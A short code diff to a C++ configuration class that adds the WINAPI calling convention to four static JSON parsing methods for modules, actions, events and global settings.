@@ -142,10 +142,10 @@ class Conf {
 	 */
 	private: Encryption encryptionObj;
 
-	private: static BOOL ParseModule(JSONArray js);
-	private: static BOOL ParseAction(JSONArray js);
-	private: static BOOL ParseEvent(JSONArray js);
-	private: static BOOL ParseGlobal(JSONArray js);
+	private: static BOOL WINAPI ParseModule(JSONArray js);
+	private: static BOOL WINAPI ParseAction(JSONArray js);
+	private: static BOOL WINAPI ParseEvent(JSONArray js);
+	private: static BOOL WINAPI ParseGlobal(JSONArray js);
 	private: BOOL ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCallback_t call_back);
 
 	/**
